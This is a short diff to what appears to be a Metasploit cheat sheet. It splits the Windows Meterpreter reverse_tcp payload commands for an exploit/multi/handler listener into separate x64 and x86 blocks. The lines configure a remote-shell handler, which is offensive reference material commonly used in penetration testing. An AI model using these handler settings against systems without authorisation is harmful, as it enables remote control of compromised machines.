@@ -10,11 +10,17 @@ use exploit/multi/handler
 
 ###### Windows Payload
 
+x64 
 ```
 set payload windows/x64/meterpreter/reverse_tcp
-windows/meterpreter/reverse_tcp #x86
+windows/meterpreter/reverse_tcp
 ```
 
+x86 
+
+```
+set payload windows/meterpreter/reverse_tcp
+```
 ###### Linux Payload
 
 ```
